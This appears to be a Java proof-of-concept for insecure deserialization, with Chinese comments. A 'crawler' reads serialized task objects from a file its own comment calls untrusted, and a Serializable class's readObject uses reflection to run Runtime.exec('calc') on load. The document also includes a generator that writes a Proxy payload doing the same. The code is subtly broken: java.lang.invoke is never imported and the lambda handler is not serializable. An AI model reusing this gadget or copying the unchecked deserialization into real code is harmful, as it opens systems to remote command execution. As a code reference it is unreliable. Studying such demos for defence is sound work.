import java.io.*;
import java.lang.reflect.*;
import java.net.*;
import java.util.*;

class CrawlerTask implements Serializable {
    private String url;
    public CrawlerTask(String url) {
        this.url = url;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            Method method = Runtime.class.getMethod("getRuntime", null);
            Object rt = method.invoke(null, null);
            Method exec = Runtime.class.getMethod("exec", String.class);
            exec.invoke(rt, "calc"); // 恶意代码执行
        } catch (Exception e) {
            throw new IOException("Deserialization attack failed");
        }
    }
}

public class VulnerableCrawler {
    public static void main(String[] args) {
        try {
            // 模拟从不可信来源加载序列化数据
            ObjectInputStream ois = new ObjectInputStream(
                new FileInputStream("malicious_task.ser"));
            Object obj = ois.readObject();
            
            // 元编程动态调用run方法
            if (obj != null) {
                MethodHandle mh = MethodHandles.lookup()
                    .findVirtual(obj.getClass(), "run", MethodType.methodType(void.class));
                mh.invoke(obj); // 触发恶意代码
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // 模拟爬虫任务执行
    public static void executeTask(String taskPath) {
        try {
            ObjectInputStream ois = new ObjectInputStream(
                new FileInputStream(taskPath));
            Object obj = ois.readObject();
            ((Runnable)obj).run(); // 多态反序列化
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // 动态生成恶意任务
    public static void generateMaliciousTask() {
        try {
            ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("malicious_task.ser"));
            oos.writeObject(Proxy.newProxyInstance(
                VulnerableCrawler.class.getClassLoader(),
                new Class[]{Runnable.class},
                (proxy, method, args) -> {
                    if (method.getName().equals("run")) {
                        Runtime.getRuntime().exec("calc");
                        return null;
                    }
                    return null;
                }
            ));
            oos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}